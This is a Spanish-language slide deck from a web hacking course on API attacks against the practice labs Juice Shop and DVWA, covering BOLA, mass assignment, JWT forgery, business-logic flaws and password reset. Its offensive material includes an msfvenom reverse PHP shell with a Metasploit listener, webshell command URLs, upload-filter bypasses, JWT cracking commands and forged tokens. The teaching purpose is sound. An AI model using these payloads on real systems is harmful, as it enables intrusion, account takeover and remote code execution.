# Deck 4_1 · Módulo 4 · Clase 1

---

# APIs & Explotación Avanzada
## Módulo 4 · Clase 1

> Curso de Web Hacking
> Duración: ~2 horas (segunda parte de Clase 4, después de XSS+BeEF)
> Target: Juice Shop · DVWA

---

## Después de la pausa

Vienen de ver **XSS + BeEF** (control de navegadores de víctimas). Ahora cambiamos de capa: dejamos el DOM y el navegador, y vamos directo a la **API** que alimenta la aplicación.

> Mismo target (Juice Shop), otra superficie de ataque.

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | API1 — BOLA (teoría + demo en Juice Shop) | ~18 min |
| **2** | API3 — Mass Assignment (teoría + demo + defensa) | ~14 min |
| **3** | JWT attacks (estructura, alg none, weak secret + demo) | ~16 min |
| **4** | File Upload → RCE (bypasses + demo en DVWA) | ~14 min |
| ⏸ | Pausa | ~8 min |
| **5** | Metasploit para Web (msfvenom + módulos auxiliares) | ~14 min |
| **6** | API5 — Broken Function Level Auth (demo `PUT /api/Products`) | ~9 min |
| **7** | API6 — Business Logic (cantidad negativa en el carrito; cupones vencidos como referencia) | ~9 min |
| **8** | API Discovery & Sensitive Data (Swagger + secrets expuestos) | ~8 min |
| **9** | Password Reset débil (OSINT + demo) | ~7 min |

**Patrón de la clase:** explicar → detectar → demo en vivo

---

## El nuevo paradigma

## Las apps modernas son APIs

- El frontend es solo una interfaz sobre una API REST o GraphQL
- La autenticación viaja en tokens JWT en el header `Authorization`
- Los datos sensibles pasan por endpoints `/api/*`
- Múltiples microservicios comunicándose entre sí

> El atacante ya no hackea "la web". Hackea la API que la alimenta.

---

## Superficie de ataque de una API

| Superficie | Qué buscar |
| --- | --- |
| Endpoints `/api/*` | IDs predecibles, falta de authz |
| Tokens JWT | Algoritmo débil, secret expuesto |
| Documentación expuesta | `/api-docs`, `/swagger.json`, `/graphql` |
| CORS | Orígenes permitidos sin validar |
| Headers de respuesta | Versiones de framework, stack info |

---

## OWASP API Security Top 10

| ID | Nombre (2023) | Demo en clase |
| --- | --- | --- |
| **API1** | **Broken Object Level Auth (BOLA)** | Cambiar ID en `/api/Users/N` |
| API2 | Broken Authentication | JWT débil, password reset |
| **API3** | **Broken Object Property Level Auth** | Mass Assignment: `role:admin` al registrarse |
| API4 | Unrestricted Resource Consumption | Rate limiting ausente |
| **API5** | **Broken Function Level Auth** | `PUT /api/Products` como usuario normal |
| **API6** | **Unrestricted Access to Sensitive Business Flows** | Precio negativo, cupón vencido |
| API7 | Server Side Request Forgery (SSRF) | — |
| **API8** | **Security Misconfiguration** | Swagger expuesto, secrets en JS |
| API9 | Improper Inventory Management | Endpoints sin dar de baja |
| API10 | Unsafe Consumption of APIs | — |

---

## API1: BOLA

---

## BOLA — qué es

## Broken Object Level Authorization

- El servidor **no verifica** si el usuario tiene permiso sobre el objeto específico
- Solo valida autenticación, no qué puede ver
- El frontend muestra "tus" recursos, pero la API acepta **cualquier ID**

**Ejemplo:** logueado como usuario 2 (jim@juice-sh.op). La API acepta `GET /api/Users/1` → datos del admin (admin@juice-sh.op).

> No todos los IDs existen en el seed de Juice Shop — si uno falla, probar del 1 al 24.

---

## BOLA — por qué ocurre

- El developer confía en que el cliente solo manda IDs propios
- No se valida ownership: falta `WHERE id = ? AND user_id = ?`
- Los IDs son secuenciales y predecibles (1, 2, 3...)

```
Código vulnerable:
GET /api/orders/{id}
SELECT * FROM orders WHERE id = ?

Código correcto:
SELECT * FROM orders WHERE id = ? AND user_id = currentUser
```

---

## BOLA — cómo detectarlo

1. Loguearse y capturar request con ID en Burp
2. Cambiar el ID por otro valor
3. Observar si la respuesta contiene datos de otro usuario
4. Enumerar IDs: Burp Intruder con payload numérico secuencial

**Señales de alerta:**
- IDs numéricos secuenciales en la URL
- Endpoint "mi perfil" que acepta ID externo
- UUIDs pero la API responde con cualquier UUID válido

---

## Demo — BOLA en Juice Shop

```http
POST /rest/user/login
{"email":"usuario@test.com","password":"test"}

GET /api/Users/2
Authorization: Bearer <token>

GET /api/Users/1
GET /api/Users/3
GET /api/Users/4
```

Burp Intruder: payload numérico 1 a 24 para enumerar usuarios (no todos los IDs existen en el seed — probar 1 a 24 si uno falla)

---

## Impacto real de BOLA

- Acceso a PII de **todos** los usuarios (emails, direcciones, órdenes)
- Escalada a objetos de admin
- Filtración masiva: una vulnerabilidad, todos los registros
- **El más prevalente en APIs:** OWASP API1 desde 2019 y 2023

> BOLA representa ~40% de los reportes de bug bounty en APIs REST.

---

## API3: Mass Assignment

---

## Mass Assignment — qué es

El servidor acepta **campos extra** en el JSON que el cliente no debería poder enviar.

```json
POST /api/Users
{
  "email": "hacker@test.com",
  "password": "test123",
  "role": "admin",
  "isAdmin": true,
  "credit": 999999
}
```

Si el framework auto-bindea el body al modelo sin filtrar → **Mass Assignment**.

---

## Mass Assignment — por qué ocurre

- Frameworks modernos auto-bindean body al modelo sin configuración explícita
- El developer no define qué campos acepta cada endpoint
- Se confía en que el frontend no va a mandar esos campos

| Framework | Auto-binding | Protección |
| --- | --- | --- |
| Node.js + Mongoose | Sí | Schema estricto |
| Ruby on Rails | Sí | Strong Params |
| Spring Boot | Sí | @JsonIgnore o DTOs |
| Laravel | Sí | $fillable o $guarded |

---

## Demo — Mass Assignment en Juice Shop

```json
POST /api/Users/
{
  "email": "pwned@test.com",
  "password": "Test1234!",
  "passwordRepeat": "Test1234!",
  "role": "admin"
}
```

Juice Shop responde con role: admin.

Login → JWT con role:admin → acceso a /#/administration

---

## Defensa: DTOs y Allowlist

```javascript
// Vulnerable
const user = await User.create(req.body);

// Seguro
const { email, password } = req.body;
const user = await User.create({
  email,
  password,
  role: 'customer'  // definido por el servidor
});
```

Regla: nunca dejar que el cliente defina su propio rol, precio o permisos.

---

## JWT: Broken Authentication

---

## JWT — estructura

```
Header.Payload.Signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"email":"user@test.com","role":"customer","exp":...}
Signature: HMAC-SHA256(header+payload, secret)
```

| Parte | Riesgo |
| --- | --- |
| Header alg | Cambiar a "none" = sin firma |
| Payload role | Modificable si no se valida la firma |
| Secret débil | Crackeable con hashcat en segundos (si el algoritmo es HS256) |

> Nota: Juice Shop v20.2.0 firma con **RS256** (clave asimétrica) — no hay secret HMAC débil que crackear en esta versión. El ataque que sigue funcionando es `alg: none` (demo abajo).

Herramienta: jwt.io — decodea sin necesitar el secret

---

## JWT — ataques comunes

- **Algorithm None:** cambiar alg a none + eliminar la firma
- **Weak Secret:** si el secret es "secret" o "123456" → crackeable (⚠️ no aplica a Juice Shop v20.2.0 — firma con RS256, no hay secret HMAC)
- **RS256 → HS256 confusion:** usar public key como secret HMAC
- **Expiración ignorada:** reutilizar tokens vencidos

```bash
# Brute force del JWT secret
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <token> -T
python3 jwt_tool.py <token> -X a
python3 jwt_tool.py <token> -C -d rockyou.txt
```

---

## Demo — JWT en Juice Shop

```
1. Login → copiar JWT del header Authorization

2. Decodear en jwt.io:
   Header: {"typ":"JWT","alg":"RS256"}
   Payload: {"data":{"id":2,"email":"jim@juice-sh.op","role":"customer"}}

   Juice Shop v20.2.0 firma con RS256 (clave asimétrica) — el secret
   "secret" de versiones viejas ya NO existe, no se puede crackear ni re-firmar.

3. Ataque que SÍ funciona: alg:none (ver bullet arriba)
   Header:  {"typ":"JWT","alg":"none"}
   Payload: {"data":{"id":1,"role":"admin"}}
   Firma:   (vacía)

   Token armado a mano: base64url(header) + "." + base64url(payload) + "."

4. Usar ese token en Burp contra un endpoint autenticado
   (ej. GET /api/Users/1) → el servidor responde 200 sin validar la
   firma: acepta JWT sin firmar si alg dice "none"
```

---

## File Upload → RCE

---

## File Upload — la vulnerabilidad

Subir archivos sin validar tipo y contenido puede llevar a **Remote Code Execution**.

Flujo del ataque:
1. Encontrar formulario de upload
2. Subir archivo .php malicioso
3. Si el servidor guarda en directorio web → RCE

```
http://victim/uploads/shell.php?cmd=whoami
http://victim/uploads/shell.php?cmd=id
```

---

## Bypasses de File Upload

| Técnica | Cómo | Cuándo funciona |
| --- | --- | --- |
| Extensión alternativa | .php5, .phtml | Solo valida extensión |
| MIME spoofing | Content-Type: image/jpeg | Solo valida MIME |
| Magic bytes | GIF89a; al inicio | Valida magic bytes |
| Null byte | shell.php%00.jpg | Lenguajes con null byte |
| Double extension | shell.jpg.php | Mala config Apache |

---

## Demo — File Upload en DVWA

```
Nivel Low:
→ Subir shell.php directamente
→ /hackable/uploads/shell.php?cmd=id

Nivel Medium (valida Content-Type):
→ Burp: cambiar Content-Type: image/jpeg

Nivel High (extensión + magic bytes):
→ Renombrar a shell.php5
→ Agregar GIF89a; al inicio del PHP

⚠️ No reproducible en este lab: este bypass depende de que el servidor
tenga .php5 mapeado como handler PHP — no es el caso acá (Apache valida
extensión estricta jpg/jpeg/png y, aunque se bypasee con doble extensión
shell.php.jpg, no hay handler-chain que lo ejecute como PHP). Queda como
referencia conceptual, no demostrable en vivo en esta instancia.
```

Target: https://dvwa.labs.manuel-roldan.cloud

---

## Pausa — 5-10 min

Estiren las piernas. Al volver: Metasploit, para explotar en automático lo que acabamos de hacer a mano.

---

## Metasploit para Web

---

## Metasploit — módulos web útiles

| Módulo | Función |
| --- | --- |
| `exploit/multi/handler` | Recibir reverse shell |
| `auxiliary/scanner/http/sql_injection` | Detectar SQLi |
| `auxiliary/scanner/http/brute_dirs` | Enumerar directorios |
| `exploit/.../wordpress_admin_shell_upload` | RCE en WordPress |

**auxiliary** = detecta sin explotar
**exploit** = explota activamente

---

## Demo — Reverse Shell con msfvenom

```bash
# 1. Generar payload PHP
msfvenom -p php/reverse_php LHOST=<ip-kali> LPORT=4444 -f raw > revshell.php

# 2. Subir via DVWA File Upload (nivel Low)

# 3. Listener en Metasploit
msfconsole
use exploit/multi/handler
set payload php/reverse_php
set LHOST <ip-kali>
set LPORT 4444
run

# 4. Activar el payload
curl https://dvwa.labs.../hackable/uploads/revshell.php
```

---

## Módulos auxiliares útiles

```bash
use auxiliary/scanner/http/sql_injection
set RHOSTS target.com
set TARGETURI /app.php?id=1
run

use auxiliary/scanner/http/brute_dirs
set RHOSTS target.com
run

use auxiliary/scanner/http/wordpress_scanner
set RHOSTS target.com
run
```

---

## API5: Broken Function Level Authorization

---

## API5 — usuarios normales llamando endpoints de admin

El servidor no verifica el **rol** del usuario, solo que esté autenticado.

```http
PUT /api/Products/1
Authorization: Bearer <token-usuario-normal>
Content-Type: application/json

{
  "price": 0.00,
  "name": "FREE BEER",
  "description": "Hackeado por API5"
}
```

→ Juice Shop acepta el cambio. El producto se actualiza para **todos los usuarios**.

**Por qué es grave:** cualquier cliente autenticado puede modificar el catálogo, borrar reviews, ver listas de usuarios — operaciones reservadas para admins.

---

## Demo — PUT /api/Products en Juice Shop

```
1. Login como usuario normal

2. Burp → capturar cualquier request
   Cambiar a:
   PUT /api/Products/1
   {"price": 0.00, "name": "FREE BEER"}

3. Forward → recargar la tienda en el browser

4. El producto cambió de nombre y precio para todos
   → Checkout con precio $0.00

5. ¿Hay validación de rol? No.
   El servidor solo verifica Bearer token válido.

6. Peor aún: ni siquiera hace falta estar autenticado.
   Repetir el PUT /api/Products/1 sin header Authorization
   → también devuelve 200 y modifica el producto.
```

**Diferencia con BOLA (API1):** BOLA es acceder a *datos* de otro usuario.
API5 es ejecutar *operaciones* que solo debería poder hacer un admin.

---

## API6: Business Logic

---

## Business Logic — qué es

No es un bug de código. Es **usar la app como fue diseñada, pero de forma no intencionada**.

```
Casos clásicos en Juice Shop:
- Precio negativo en el carrito → descuento infinito
- Descuentos acumulables
- Comprar productos que no existen
- Cambiar BasketId para usar el carrito de otro usuario
```

| Categoría | OWASP API |
| --- | --- |
| Flujo de negocio no restringido | **API6** |
| `PUT /api/Products` (precio/nombre) | **API5** |
| BOLA en basket | API1: BOLA |

---

## Demo — Cantidad negativa en el carrito (Business Logic)

```
1. POST /api/BasketItems/ {"ProductId":1,"BasketId":<tu_basket_id>,"quantity":1}
   → agrega producto al carrito

2. PUT /api/BasketItems/<id_del_item> {"quantity":-100}
   → el backend acepta cantidad negativa sin validar

3. Ver el carrito: el precio total ahora es negativo
```

**Enseñanza:** la validación de negocio nunca debe vivir solo en el cliente — el backend debe verificar rangos e integridad de forma independiente.

---

## Referencia conceptual — Cupones vencidos (no reproducible en esta versión)

⚠️ **No reproducible en esta versión de Juice Shop** — las apps evolucionan: el cupón `WMNSDY2019` ya no es válido contra la instancia real (devuelve `404 Invalid coupon`, igual que un código inventado). Alternativa confirmada funcionando: cantidad negativa (arriba).

Los cupones de Juice Shop estaban **hardcodeados en el JavaScript del frontend**.

```
DevTools → Sources → main.js
Buscar: "coupon" o "WMNSDY" o "ORANGE"
  {code: "WMNSDY2019", discount: 75, validOn: 1551999600000}
```

Validación también vivía en el cliente:

```javascript
if (coupon.validOn < Date.now()) {
  // cupón vencido — rechazar
}
```

**Técnica (conceptual, queda como referencia):**
```
Opción 1 — Burp: POST /rest/basket/1/coupon/WMNSDY2019 → backend no re-valida fecha → aplica 75% off
Opción 2 — DevTools: cambiar "if (coupon.validOn < Date.now())" por "if (false)"
Opción 3 — Leer cupones vigentes del JS y aplicarlos directo, sin pasar por la UI
```

**También es Business Logic:** el mismo patrón sirve para cambiar `BasketId` y ver el carrito de otro usuario (BOLA).

---

## API Discovery & Sensitive Data

Antes de atacar, **mapeá**: Swagger/OpenAPI expuesto + secrets hardcodeados en el JS del bundle.

```
En Juice Shop → DevTools → Network
→ Filtrar por XHR / Fetch → ver todas las llamadas a /api/* y /rest/*

Endpoints interesantes:
  GET  /api/Users/   ← lista todos los usuarios (admin)
  GET  /api-docs     ← ¡Swagger/OpenAPI expuesto!

Dónde buscar secrets:
  DevTools → Sources → JS bundles: API keys, tokens de terceros (varía por versión)
  DevTools → Application → Local Storage: token JWT (XSS lo roba fácil)
```

---

## Demo — Swagger + Secrets en Juice Shop

```
1. Abrir https://juice.labs.../api-docs
   → Ver TODOS los endpoints documentados (algunos no enlazados en la UI)
   → Buscar endpoints "admin only" sin protección: DELETE /api/Users/:id, GET /api/Users/

2. DevTools → Sources → main.js (bundle Angular)
   Ctrl+F: "token"    → cómo se guarda el auth
   (en versiones actuales ya no hay passwords/secrets hardcodeados visibles acá)

3. Application → Local Storage → localhost
   → Token JWT completo → copiar y decodear en jwt.io

4. Provocar un error (ej. request malformado a /rest/...) y mirar
   el <title> de la página de error → revela el framework y versión
   exacta: "OWASP Juice Shop (Express ^4.22.1)"
```

---

## Takeaways — exposición antes del ataque

- Documentación de API expuesta en producción = regalo para el atacante.
- El frontend Angular compila todo el código cliente — el atacante lo lee.

---

## Password Reset débil

---

## Password Reset — autenticación que se puede bypassear

Juice Shop usa **preguntas de seguridad** cuyas respuestas son obtenibles por OSINT.

```
Flujo vulnerable:
1. Ir a Forgot Password
2. Ingresar email de la víctima (visible en reseñas, perfil público)
3. Responder pregunta de seguridad
4. Cambiar contraseña sin verificación extra
```

Los usuarios de Juice Shop tienen preguntas como:
- "¿Nombre de tu primera mascota?"
- "¿Ciudad donde naciste?"

**Si el email es real → las respuestas están en redes sociales.**

---

## Demo — Password Reset en Juice Shop

```
Target: admin@juice-sh.op

1. Ir a /#/forgot-password
2. Email: admin@juice-sh.op
3. Pregunta: "What is your mother maiden name?"
4. Respuesta: "Simpson" (lore del personaje en el código fuente)

Target: jim@juice-sh.op
Pregunta: "What is your favorite movie?"
Respuesta: "Star Wars" (nombre de usuario = Jim → referencia Star Trek)

→ Cambiar contraseña del admin sin saber la original
```

**OWASP API2 — Broken Authentication:** el mecanismo de recuperación es parte del flujo de autenticación.


## Resumen de lo aprendido

- **BOLA:** cambiar IDs en la URL accede a recursos de otros usuarios
- **Mass Assignment (API3):** enviar `role:admin` en el JSON para escalar privilegios
- **JWT:** algorithm none, weak secret, modificar payload con secret conocido
- **API5:** `PUT /api/Products` como usuario normal — cambiar precio a $0
- **API6 / Business Logic:** precio negativo en carrito, cupones vencidos hardcodeados en JS
- **API Discovery & Sensitive Data:** Swagger expuesto + secrets hardcodeados en JS/localStorage
- **Password Reset:** OSINT + preguntas débiles → cambio de contraseña sin auth
- **File Upload + Metasploit:** RCE via webshell PHP

**Las APIs confían demasiado en el cliente. El cliente siempre puede mentir.**

---

## Próxima clase

## Clase 5 — Recon avanzado, XSS automatizado & Defensa

- Recon avanzado y XSS automatizado con herramientas (Módulo 3 recortado)
- HTTP Security Headers (CSP, HSTS, X-Frame-Options)
- Cookies seguras (HttpOnly, Secure, SameSite)
- Validación server-side y Prepared Statements
- WAF + Rate Limiting
- Checklist final del desarrollador seguro

**La última clase cierra el ciclo: de atacar a defender.**

---

## Gracias

**¿Preguntas?**

La API nunca miente — el frontend sí.

Practiquen BOLA y Mass Assignment en Juice Shop, File Upload en DVWA.

Nos vemos en el cierre del curso 🚀
